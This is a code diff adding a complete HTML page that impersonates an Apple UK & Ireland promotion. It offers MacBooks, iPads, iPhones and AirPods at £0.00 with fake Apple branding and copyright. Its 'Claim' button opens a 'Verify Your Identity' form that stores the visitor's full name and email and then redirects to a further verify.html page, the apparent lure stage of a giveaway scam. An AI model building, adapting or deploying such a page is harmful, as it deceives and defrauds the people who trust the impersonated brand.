@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple UK & Ireland Promotion</title>
+    <style>
+        /* Reset e Estilo Geral */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        /* Header com Logo */
+        header {
+            padding: 10px 20px;
+            background-color: #fff;
+            border-bottom: 1px solid #d2d2d7;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .apple-logo {
+            width: 35px;
+            height: auto;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .header-icon {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.3s ease;
+        }
+
+        .header-icon:hover {
+            opacity: 1;
+        }
+
+        /* Seção Principal */
+        .hero {
+            padding: 30px 20px;
+            background-color: #f5f5f7;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #1d1d1f;
+        }
+
+        .hero p {
+            font-size: 24px;
+            color: #6e6e73;
+            max-width: 600px;
+            margin: 0 auto 20px;
+        }
+
+        /* Seção de Produtos */
+        .products {
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .product-section {
+            background-color: #fff;
+            padding: 40px;
+            margin-bottom: 20px;
+            border-radius: 18px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        .product-section img {
+            width: 300px;
+            height: 300px;
+            object-fit: contain;
+            margin-bottom: 20px;
+        }
+
+        .product-section h2 {
+            font-size: 40px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .product-section p {
+            font-size: 20px;
+            color: #6e6e73;
+            margin-bottom: 20px;
+        }
+
+        .product-section .highlight {
+            color: #bf5af2;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .product-section .price {
+            font-size: 28px;
+            font-weight: 600;
+            color: #0071e3;
+            margin-bottom: 20px;
+        }
+
+        .buttons {
+            margin-top: 20px;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            margin: 0 10px;
+            background-color: #0071e3;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            transition: opacity 0.3s ease;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            opacity: 0.8;
+        }
+
+        /* Estilo do botão desabilitado */
+        .btn:disabled {
+            background-color: #0071e3;
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Seletor de Cores */
+        .color-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            justify-content: center;
+        }
+
+        .color-option {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: border 0.3s ease;
+        }
+
+        .color-option.selected {
+            border: 2px solid #0071e3;
+        }
+
+        /* Cores dos produtos */
+        .midnight { background-color: #1C2526; }
+        .space-gray { background-color: #4A4A4A; }
+        .starlight { background-color: #F5E9D4; }
+        .space-black { background-color: #1F2020; }
+        .silver { background-color: #E3E4E5; }
+        .natural-titanium { background-color: #D9D3C7; }
+        .black-titanium { background-color: #2C2C2E; }
+        .white-titanium { background-color: #F5F5F5; }
+        .desert-titanium { background-color: #C9B79C; }
+
+        /* Modal de Verificação */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 18px;
+            max-width: 400px;
+            width: 90%;
+            text-align: left;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+
+        .modal-content h3 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #1d1d1f;
+        }
+
+        .modal-specs ul {
+            list-style: none;
+            padding-left: 20px;
+            margin-bottom: 15px;
+        }
+
+        .modal-specs li {
+            font-size: 16px;
+            color: #1d1d1f;
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .modal-specs li::before {
+            content: "•";
+            color: #0071e3;
+            font-weight: bold;
+            display: inline-block;
+            width: 1em;
+            margin-left: -1em;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 24px;
+            color: #6e6e73;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        /* Modal de Verificação */
+        #modal-verify .modal-content {
+            text-align: left;
+        }
+
+        #modal-verify .modal-content input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        #modal-verify .modal-content input:focus {
+            outline: none;
+            border-color: #0071e3;
+            box-shadow: 0 0 5px rgba(0, 113, 227, 0.5);
+        }
+
+        #modal-verify .modal-content .verify-btn {
+            background-color: #0071e3;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+            width: 100%;
+        }
+
+        #modal-verify .modal-content .verify-btn:hover {
+            opacity: 0.8;
+        }
+
+        #modal-verify .modal-content .verify-btn:disabled {
+            background-color: #0071e3;
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #f5f5f7;
+            padding: 20px 0;
+            text-align: center;
+            font-size: 12px;
+            color: #6e6e73;
+            border-top: 1px solid #d2d2d7;
+            width: 100%;
+        }
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .footer-copyright {
+            font-size: 12px;
+            color: #6e6e73;
+            margin-bottom: 5px;
+        }
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 32px;
+            }
+
+            .hero p {
+                font-size: 18px;
+            }
+
+            .hero {
+                padding: 15px 20px;
+            }
+
+            .product-section {
+                padding: 20px;
+            }
+
+            .product-section img {
+                width: 250px;
+                height: 250px;
+                object-fit: contain;
+            }
+
+            .product-section h2 {
+                font-size: 28px;
+            }
+
+            .product-section p {
+                font-size: 16px;
+            }
+
+            .color-option {
+                width: 25px;
+                height: 25px;
+            }
+
+            .modal-content {
+                width: 95%;
+                padding: 15px;
+            }
+
+            .modal-content h3 {
+                font-size: 20px;
+            }
+
+            .modal-specs li {
+                font-size: 14px;
+                margin-bottom: 6px;
+            }
+
+            .header-icons {
+                gap: 12px;
+            }
+
+            .header-icon {
+                width: 16px;
+                height: 16px;
+            }
+
+            .apple-logo {
+                width: 45px;
+            }
+
+            .close-btn {
+                top: 8px;
+                right: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <img src="https://pixsector.com/cache/56f2646e/avd5cee2ff5ea9da4d328.png" alt="Apple Logo" class="apple-logo">
+        <div class="header-icons">
+            <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4H6z"></path>
+                <line x1="3" y1="6" x2="21" y2="6"></line>
+                <path d="M16 10a4 4 0 0 1-8 0"></path>
+            </svg>
+            <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <line x1="4" y1="12" x2="20" y2="12"></line>
+                <line x1="4" y1="6" x2="20" y2="6"></line>
+                <line x1="4" y1="18" x2="20" y2="18"></line>
+            </svg>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <h1>Experience The Latest Apple Devices</h1>
+        <p>Pay £0 today check your eligibility to proceed.</p>
+    </section>
+
+    <!-- Produtos -->
+    <section class="products">
+        <!-- MacBook Air -->
+        <div class="product-section">
+            <img src="https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/mba13-skyblue-select-202503?wid=904&hei=840&fmt=jpeg&qlt=95&.v=1741885365897" alt="MacBook Air M4">
+            <h2>MacBook Air</h2>
+            <p>Sky blue colour. Sky high performance with M4.</p>
+            <div class="highlight">Built for Apple Intelligence.</div>
+            <div class="price">£0.00</div>
+            <div class="color-selector" data-product="macbook">
+                <div class="color-option midnight selected" data-color="Midnight"></div>
+                <div class="color-option space-gray" data-color="Space Gray"></div>
+                <div class="color-option starlight" data-color="Starlight"></div>
+            </div>
+            <div class="buttons">
+                <a class="btn learn-more-btn" data-modal="modal-macbook">Learn more</a>
+                <button class="btn verify-btn" id="verify-macbook" data-product="macbook" disabled>Claim</button>
+            </div>
+        </div>
+
+        <!-- iPad Pro -->
+        <div class="product-section">
+            <img src="https://cdsassets.apple.com/live/SZLF0YNV/images/sp/111979_ipad-pro-12-2018.png" alt="iPad Pro">
+            <h2>iPad Pro</h2>
+            <p>Ultra Retina XDR display. Powered by M4 chip.</p>
+            <div class="highlight">Designed for creativity.</div>
+            <div class="price">£0.00</div>
+            <div class="color-selector" data-product="ipad">
+                <div class="color-option space-black selected" data-color="Space Black"></div>
+                <div class="color-option silver" data-color="Silver"></div>
+                <div class="color-option natural-titanium" data-color="Natural Titanium"></div>
+            </div>
+            <div class="buttons">
+                <a class="btn learn-more-btn" data-modal="modal-ipad">Learn more</a>
+                <button class="btn verify-btn" id="verify-ipad" data-product="ipad" disabled>Claim</button>
+            </div>
+        </div>
+
+        <!-- iPhone 15 Pro Max -->
+        <div class="product-section">
+            <img src="https://raw.githubusercontent.com/hdpngworld/HPW/main/uploads/65038654434d0-iPhone%2015%20Pro%20Natural%20titanium%20png.png" alt="iPhone 15 Pro Max">
+            <h2>iPhone 15 Pro Max</h2>
+            <p>A17 Pro chip. 5x telephoto camera.</p>
+            <div class="highlight">Titanium design.</div>
+            <div class="price">£0.00</div>
+            <div class="color-selector" data-product="iphone15">
+                <div class="color-option black-titanium selected" data-color="Black Titanium"></div>
+                <div class="color-option natural-titanium" data-color="Natural Titanium"></div>
+                <div class="color-option white-titanium" data-color="White Titanium"></div>
+            </div>
+            <div class="buttons">
+                <a class="btn learn-more-btn" data-modal="modal-iphone15">Learn more</a>
+                <button class="btn verify-btn" id="verify-iphone15" data-product="iphone15" disabled>Claim</button>
+            </div>
+        </div>
+
+        <!-- iPhone 16 Pro Max -->
+        <div class="product-section">
+            <img src="https://directunlocks.com/devices/compressed/iphone-16-pro.png?v=6" alt="iPhone 16 Pro Max">
+            <h2>iPhone 16 Pro Max</h2>
+            <p>6.9-inch display. Camera Control.</p>
+            <div class="highlight">A18 Pro chip.</div>
+            <div class="price">£0.00</div>
+            <div class="color-selector" data-product="iphone16">
+                <div class="color-option black-titanium selected" data-color="Black Titanium"></div>
+                <div class="color-option desert-titanium" data-color="Desert Titanium"></div>
+                <div class="color-option white-titanium" data-color="White Titanium"></div>
+            </div>
+            <div class="buttons">
+                <a class="btn learn-more-btn" data-modal="modal-iphone16">Learn more</a>
+                <button class="btn verify-btn" id="verify-iphone16" data-product="iphone16" disabled>Claim</button>
+            </div>
+        </div>
+
+        <!-- AirPods Max 2 -->
+        <div class="product-section">
+            <img src="https://help.apple.com/assets/673D1566902AEA8557045FB2/673D1574A739A4528A02AF54/pt_BR/be407fad48c9ccafcd87007eb6645d61.png" alt="AirPods Max 2">
+            <h2>AirPods Max</h2>
+            <p>Immersive sound. Active Noise Cancellation.</p>
+            <div class="highlight">Now with USB-C charging.</div>
+            <div class="price">£0.00</div>
+            <div class="color-selector" data-product="airpodsmax">
+                <div class="color-option space-gray selected" data-color="Space Gray"></div>
+                <div class="color-option silver" data-color="Silver"></div>
+                <div class="color-option midnight" data-color="Midnight"></div>
+            </div>
+            <div class="buttons">
+                <a class="btn learn-more-btn" data-modal="modal-airpodsmax">Learn more</a>
+                <button class="btn verify-btn" id="verify-airpodsmax" data-product="airpodsmax" disabled>Claim</button>
+            </div>
+        </div>
+
+        <!-- AirPods 4 -->
+        <div class="product-section">
+            <img src="https://cdsassets.apple.com/live/7WUAS350/images/tech-specs/121204-airpods-4-anc.png" alt="AirPods 4">
+            <h2>AirPods 4</h2>
+            <p>Rich sound. Active Noise Cancellation.</p>
+            <div class="highlight">Spatial Audio magic.</div>
+            <div class="price">£0.00</div>
+            <div class="color-selector" data-product="airpods4">
+                <div class="color-option white selected" data-color="White"></div>
+                <div class="color-option silver" data-color="Silver"></div>
+                <div class="color-option natural-titanium" data-color="Natural Titanium"></div>
+            </div>
+            <div class="buttons">
+                <a class="btn learn-more-btn" data-modal="modal-airpods4">Learn more</a>
+                <button class="btn verify-btn" id="verify-airpods4" data-product="airpods4" disabled>Claim</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Modal de Verificação -->
+    <div class="modal" id="modal-verify">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h3>Verify Your Identity</h3>
+            <input type="text" id="full-name" placeholder="Full Name" required>
+            <input type="email" id="email" placeholder="Email" required>
+            <button class="verify-btn" id="submit-verify" disabled>Verify</button>
+        </div>
+    </div>
+
+    <!-- Modals para cada produto -->
+    <!-- Modal MacBook Air -->
+    <div class="modal" id="modal-macbook">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h3>MacBook Air M4</h3>
+            <div class="modal-specs">
+                <ul>
+                    <li>Chip: Apple M4</li>
+                    <li>Display: 13.6-inch Liquid Retina</li>
+                    <li>Battery: Up to 18 hours</li>
+                    <li>Weight: 1.24 kg</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal iPad Pro -->
+    <div class="modal" id="modal-ipad">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h3>iPad Pro</h3>
+            <div class="modal-specs">
+                <ul>
+                    <li>Chip: Apple M4</li>
+                    <li>Display: 11-inch Ultra Retina XDR</li>
+                    <li>Apple Pencil: 2nd Gen compatible</li>
+                    <li>Storage: Up to 2TB</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal iPhone 15 Pro Max -->
+    <div class="modal" id="modal-iphone15">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h3>iPhone 15 Pro Max</h3>
+            <div class="modal-specs">
+                <ul>
+                    <li>Chip: A17 Pro</li>
+                    <li>Display: 6.7-inch Super Retina XDR</li>
+                    <li>Camera: 48MP Main, 5x Telephoto</li>
+                    <li>Material: Titanium</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal iPhone 16 Pro Max -->
+    <div class="modal" id="modal-iphone16">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h3>iPhone 16 Pro Max</h3>
+            <div class="modal-specs">
+                <ul>
+                    <li>Chip: A18 Pro</li>
+                    <li>Display: 6.9-inch Super Retina XDR</li>
+                    <li>Camera: 48MP Fusion, Camera Control</li>
+                    <li>Battery: Up to 29 hours video playback</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal AirPods Max 2 -->
+    <div class="modal" id="modal-airpodsmax">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h3>AirPods Max</h3>
+            <div class="modal-specs">
+                <ul>
+                    <li>Noise Cancellation: Active, Adaptive</li>
+                    <li>Charging: USB-C</li>
+                    <li>Battery: Up to 20 hours</li>
+                    <li>Weight: 384.8 g</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal AirPods 4 -->
+    <div class="modal" id="modal-airpods4">
+        <div class="modal-content">
+            <span class="close-btn">×</span>
+            <h3>AirPods 4</h3>
+            <div class="modal-specs">
+                <ul>
+                    <li>Noise Cancellation: Active</li>
+                    <li>Audio: Spatial Audio with Dynamic Head Tracking</li>
+                    <li>Battery: Up to 5 hours (ANC on)</li>
+                    <li>Resistance: IPX4 (sweat and water)</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-container">
+            <p class="footer-copyright">Copyright © 2025 Apple Inc. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- JavaScript para Modal, Seleção de Cores e Verificação -->
+    <script>
+        // Modal
+        const learnMoreButtons = document.querySelectorAll('.learn-more-btn');
+        const modals = document.querySelectorAll('.modal');
+        const closeButtons = document.querySelectorAll('.close-btn');
+        const headerIcons = document.querySelectorAll('.header-icon');
+        const verifyButtons = document.querySelectorAll('.verify-btn');
+
+        learnMoreButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const modalId = button.getAttribute('data-modal');
+                const modal = document.getElementById(modalId);
+                modal.style.display = 'flex';
+            });
+        });
+
+        closeButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const modal = button.closest('.modal');
+                modal.style.display = 'none';
+            });
+        });
+
+        modals.forEach(modal => {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
+        });
+
+        // Seleção de Cores
+        const colorSelectors = document.querySelectorAll('.color-selector');
+
+        colorSelectors.forEach(selector => {
+            const product = selector.getAttribute('data-product');
+            const verifyButton = document.getElementById(`verify-${product}`);
+            const colorOptions = selector.querySelectorAll('.color-option');
+
+            verifyButton.setAttribute('disabled', true);
+
+            colorOptions.forEach(option => {
+                option.addEventListener('click', () => {
+                    colorOptions.forEach(opt => opt.classList.remove('selected'));
+                    option.classList.add('selected');
+                    verifyButton.removeAttribute('disabled');
+                });
+            });
+        });
+
+        // Modal de Verificação
+        const verifyModal = document.getElementById('modal-verify');
+        const fullNameInput = document.getElementById('full-name');
+        const emailInput = document.getElementById('email');
+        const submitVerifyBtn = document.getElementById('submit-verify');
+
+        verifyButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const product = button.getAttribute('data-product');
+                const colorSelector = document.querySelector(`.color-selector[data-product="${product}"]`);
+                const selectedColor = colorSelector.querySelector('.color-option.selected');
+
+                // Verifica se uma cor foi selecionada
+                if (!selectedColor) {
+                    alert("Please choose a color before claiming the product.");
+                    return; // Impede a continuação se não houver cor selecionada
+                }
+
+                const colorValue = selectedColor.getAttribute('data-color');
+                localStorage.setItem('selectedProduct', product);
+                localStorage.setItem('selectedColor', colorValue);
+                verifyModal.style.display = 'flex';
+            });
+        });
+
+        [fullNameInput, emailInput].forEach(input => {
+            input.addEventListener('input', () => {
+                submitVerifyBtn.disabled = !(fullNameInput.value.trim() && emailInput.value.trim() && emailInput.value.includes('@'));
+            });
+        });
+
+        submitVerifyBtn.addEventListener('click', () => {
+            const fullName = fullNameInput.value.trim();
+            const email = emailInput.value.trim();
+            if (fullName && email && email.includes('@')) {
+                localStorage.setItem('fullName', fullName);
+                localStorage.setItem('email', email);
+                verifyModal.style.display = 'none';
+                window.location.href = 'verify.html';
+            }
+        });
+
+        closeButtons.forEach(button => {
+            if (button.closest('#modal-verify')) {
+                button.addEventListener('click', () => {
+                    verifyModal.style.display = 'none';
+                });
+            }
+        });
+
+        // Rolar para o primeiro produto ao clicar nos ícones
+        const firstProduct = document.querySelector('.product-section');
+        headerIcons.forEach(icon => {
+            icon.addEventListener('click', () => {
+                firstProduct.scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+    </script>
+</body>
+</html>
